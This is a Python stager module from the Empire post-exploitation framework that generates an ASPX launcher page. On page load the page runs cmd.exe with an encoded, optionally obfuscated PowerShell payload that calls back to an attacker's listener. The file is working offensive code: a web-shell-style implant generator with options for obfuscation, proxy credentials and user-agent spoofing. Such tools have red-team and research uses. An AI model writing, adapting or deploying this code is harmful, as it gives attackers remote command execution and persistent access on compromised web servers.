from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'ASPX Launcher',

            'Author': ['Luis Vacas @CyberVaca'],

            'Description': ('Generates a self-deleting .aspx launcher for Empire.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'OutFile' : {
                'Description'   :   'File to output .aspx launcher to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   '/tmp/launcher.aspx'
            },
            'Delete' : {
                'Description'   :   'Switch. Delete .bat after running.',
                'Required'      :   False,
                'Value'         :   'True'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        delete = self.options['Delete']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']

        obfuscateScript = False
        if obfuscate.lower() == "true":
            obfuscateScript = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            code = "<%@ Page Language=\"C#\" Debug=\"true\" Trace=\"false\" %>\n"
            code += "<%@ Import Namespace=\"System.Diagnostics\" %>\n"
            code += "<%@ Import Namespace=\"System.IO\" %>\n"
            code += "<script Language=\"c#\" runat=\"server\">\n"
            code += "void Page_Load(object sender, EventArgs e)\n"
            code += "{\n"
            code += "ProcessStartInfo psi = new ProcessStartInfo();\n"
            code += "psi.FileName = \"cmd.exe\";\n"
            code += "psi.Arguments = \"/c " + launcher + "\";\n"
            code += "psi.RedirectStandardOutput = true;\n"
            code += "psi.UseShellExecute = false;\n"
            code += "Process p = Process.Start(psi);\n"
            code += "}\n"
            code += "</script>\n"
            code += "<HTML>\n"
            code += "<HEAD>\n"
            code += "<title></title>\n"
            code += "</HEAD>\n"
            code += "<body >\n"
            code += "</form>\n"
            code += "</body>\n"
            code += "</HTML>\n"


        return code
